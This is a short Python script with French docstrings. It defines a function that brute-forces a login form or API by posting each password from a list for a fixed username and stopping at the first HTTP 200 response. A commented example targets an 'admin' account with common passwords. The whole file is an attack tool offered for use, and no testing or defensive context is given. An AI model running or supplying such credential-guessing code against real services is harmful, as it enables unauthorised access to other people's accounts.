import requests

def brute_force_login(url: str, username: str, password_list: list):
    """
    Tente de bruteforcer une API ou un formulaire de connexion.

    :param url: URL du point d'accès à bruteforcer.
    :param username: Nom d'utilisateur fixe.
    :param password_list: Liste de mots de passe à tester.
    """
    for password in password_list:
        response = requests.post(url, data={"username": username, "password": password})
        if response.status_code == 200:
            print(f"Connexion réussie avec le mot de passe : {password}")
            return password
        else:
            print(f"Échec avec le mot de passe : {password}")
    print("Aucun mot de passe trouvé.")
    return None

# Exemple d'utilisation
# password_list = ["123456", "password", "test123", "admin"]
# brute_force_login("http://example.com/login", "admin", password_list)
